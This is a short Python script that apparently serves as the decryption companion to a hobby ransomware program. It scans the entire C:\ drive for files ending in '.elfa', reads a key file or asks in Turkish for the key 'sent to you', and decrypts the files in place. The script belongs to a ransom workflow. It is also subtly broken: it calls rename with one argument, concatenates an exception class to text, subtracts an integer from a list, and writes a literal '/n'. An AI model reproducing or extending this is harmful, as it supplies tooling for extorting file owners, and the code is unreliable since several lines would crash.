import os
from cryptography.fernet import Fernet

encrypt_ext = [
    # GENERAL FORMATS
    "elfa"
    ]
encrypted = False
file_paths = []

for root,dirs,files in os.walk('C:\\'):
    for file in files : 
        file_path ,file_ext = os.path.splitext(root+'\\'+file)
        if  file=="the_key.key" or file[:-4]=="elfa":
            encrypted = True
            keyfile= root+'\\'+file
        for x in encrypt_ext:
            a="."+x
            if file_ext.endswith(a):
                file_paths.append(root+'\\'+file)
                print(root+'\\'+file)

hatacount =0

if  encrypted:
    try:
        with open(keyfile, "rb") as the_file:
            key = the_file.read()
    except:
        key = input("size gönderilen anahtarı giriniz")
else:
    print("hata")
    SystemExit()

for file in file_paths:
    try :
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_encrypted = Fernet(key).decrypt(contents)
        with open(file,"wb") as the_file:
            the_file.write(contents_encrypted)
        print(file)
        with open("paths.key", "a") as the_key:
            the_key.write(file+"/n")
        os.rename(file[0:len(file)-4])
    except Exception as e:
        with open("paths.key", "a") as the_key:
            the_key.write("hata=("+Exception+")"+file+"\n")
        print("hata="+file)
        hatacount+=1
        print(hatacount)

print(len((file_paths)-hatacount)+"=Files Encrypted")
print(hatacount)
print(len(file_paths))
